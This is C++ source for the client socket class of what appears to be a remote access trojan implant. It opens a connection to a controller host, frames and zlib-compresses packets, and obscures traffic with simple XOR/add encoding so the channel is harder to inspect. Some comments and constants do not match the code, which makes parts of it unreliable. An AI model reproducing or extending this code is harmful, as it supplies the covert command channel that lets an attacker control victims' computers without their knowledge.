// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#pragma comment(lib, "ws2_32.lib")
#include "../../common/zlib/zlib.h"
#pragma comment(lib, "../../../common/zlib/zlib.lib")
#define ZLIB_NO  1226661		//数据包无压缩模式
#define ZLIB_OK  1226662		//数据包为压缩模式
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = {'S','V','	'};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (m_Socket == SOCKET_ERROR)   
		return false;   

	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;

	ClientAddr.sin_port	= htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;

    BOOL   bConditionalAccept=TRUE;   
	DWORD  dwBytes;
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl(m_Socket, 	SIO_KEEPALIVE_VALS,	&klive,	sizeof(tcp_keepalive),	NULL,	0,	&dwBytes,	0,	NULL);
	}

	m_bIsRunning = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}
char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x87,0x73,0x99,0x57,0x77,0x68;
		data[i] ^= 0x15,0x21,0x32,0x42,0x23,0x73;
	}
	return data;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{	
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));

			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			if (nSize > 0) 
			{
				MyDecode(buff,nSize);
				pThis->OnRead((LPBYTE)buff, nSize);
			}
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}
#include <stdio.h>
void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	PBYTE pData = NULL;
	PBYTE pDeCompressionData = NULL;
	try
	{
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);
		
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			// Check real Data
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw "bad buffer";
			}
			UINT nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(UINT));
			
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				BOOL nSomp = FALSE;
				m_CompressionBuffer.Read((PBYTE) &nSomp, sizeof(BOOL));   
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				pData = new BYTE[nCompressLength];
				pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
				{
					throw "bad Allocate";
				}
				
				m_CompressionBuffer.Read(pData, nCompressLength);
				
				if(nSomp == ZLIB_NO)  //只接收没压缩数据
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pData, nCompressLength);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				
				
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch(...)
	{
		if(pData) delete [] pData;
		if(pDeCompressionData) delete [] pDeCompressionData;
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );

	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	

	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		LPBYTE			pDest = new BYTE[destLen];
		
		if (pDest == NULL)
			return 0;
		
		int	nRet = compress(pDest, &destLen, lpData, nSize);
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		BOOL nComp = ZLIB_OK;  //无压缩数据	
		m_WriteBuffer.Write((PBYTE) &nComp, sizeof(BOOL));         //写入数据不压缩标志  4 bytes

		// Write Data
		m_WriteBuffer.Write(pDest, destLen);

		delete [] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x15,0x21,0x32,0x42,0x23,0x73;
		data[i] -= 0x87,0x73,0x99,0x57,0x77,0x68;
	}
	return data;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	MyEncode((char *)lpData,nSize);

	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}
